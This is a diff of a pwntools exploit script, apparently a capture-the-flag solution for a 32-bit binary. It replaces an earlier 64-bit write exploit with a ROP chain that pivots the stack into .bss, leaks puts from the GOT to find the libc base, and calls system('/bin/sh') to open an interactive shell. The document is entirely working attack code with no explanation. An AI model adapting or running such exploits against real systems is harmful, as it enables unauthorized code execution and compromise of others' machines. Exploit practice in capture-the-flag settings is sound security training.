@@ -4,9 +4,9 @@
 
 from pwn import *
 
-local_file  = './write'
-local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
-remote_libc = '../libc.so.6'
+local_file  = './rop'
+local_libc  = '/lib/i386-linux-gnu/libc.so.6'
+remote_libc = './libc.so.6'
 
 is_local = False
 is_remote = False
@@ -46,37 +46,57 @@ def debug(cmd=''):
 
 # info
 # gadget
-prdi = 0x00000000000009e3 # pop rdi ; ret
+pr = 0x0804901e # pop ebx ; ret
+ppr = 0x080492df # pop ebx ; pop ebp ; ret
+leave = 0x8049712 # leave ; ret
 
-# elf, libc
+ebp = elf.bss()+0x200
+# stack pivot
+payload = cyclic(12)
+payload+= p32(ebp)          # ebp
+payload+= p32(0x080496d1)   # return address
+payload+= p32(0xdeadbeef)   # padding
 
-ru('puts: ')
-puts = eval(rc(14))
-ru('stack: ')
-stack = eval(rc(14))
+ru('So where we roppin boys?\n')
+se(payload)
 
-libcbase = puts - libc.sym['puts']
+# rop1
+ropchain = p32(elf.sym['puts'])+p32(elf.sym['main'])+p32(elf.got['puts'])
+pl2 = ropchain
+pl2+= p32(ebp-0xc-4)  # ebp
+pl2+= p32(leave)      # return address
+pl2+= p32(0xdeadbeef) # padding
+debug()
+se(pl2)
+
+puts = uu32(rc(4))
+info_addr('puts',puts)
+libcbase = puts-libc.sym['puts']
 info_addr('libcbase',libcbase)
-
-ptr = libcbase+0x619f60 #0x239f68
-info_addr('ptr',ptr)
 system = libcbase+libc.sym['system']
 info_addr('system',system)
-rdi = libcbase+0x619968 #0x239968
-info_addr('rdi',rdi)
+binsh = libcbase+libc.search('/bin/sh').next()
+info_addr('binsh',binsh)
 
-sl('w')
-sl(str(ptr))
-sl(str(system))
+# debug('b *0x80496ee')
 
-sl('w')
-sl(str(rdi))
-sl(str(u64('/bin/sh\0')))
+ru('So where we roppin boys?\n')
 
-debug('b *$rebase(0x969)')
-sl('q')
+# stack pivot 
+ebp = elf.bss()+0x800
+pl3 = cyclic(12)
+pl3+= p32(ebp)          # ebp
+pl3+= p32(0x080496d1)   # return address
+pl3+= p32(0xdeadbeef)   # padding
+se(pl3)
 
-# info_addr('tag',addr)
-# log.warning('--------------')
+# rop2
+ropchain = p32(system)+p32(elf.sym['main'])+p32(binsh)
+pl4 = ropchain
+pl4+= p32(ebp-0xc-4)  # ebp
+pl4+= p32(leave)      # return address
+pl4+= p32(0xdeadbeef) # padding
+se(pl4)
 
 p.interactive()
+
